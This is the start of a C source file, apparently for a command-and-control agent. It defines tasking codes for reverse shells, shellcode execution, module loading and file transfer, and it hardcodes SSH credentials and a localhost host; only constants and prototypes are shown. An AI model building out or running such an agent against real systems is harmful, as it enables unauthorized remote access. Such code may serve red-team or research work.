#include <libssh/libssh.h>
#include <curl/curl.h>
#include "examples_common.h"
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>


#define GLOB_ID "TEST_AGENT" // These two values should at some 
#define GLOB_LOGIN_ID "aris" // point be combined into one
#define GLOB_LOGIN_PASS "lala"
#define HOST "127.0.0.1"

#define AGENT_DOWN_FILE 10
#define AGENT_REV_SHELL 11
#define AGENT_UP_FILE 12
#define AGENT_EXEC_SC 13
#define AGENT_EXEC_MODULE 14
#define AGENT_EXIT 0

int func_loop(ssh_session session);
int parse_tasking(char *tasking, ssh_channel chan);
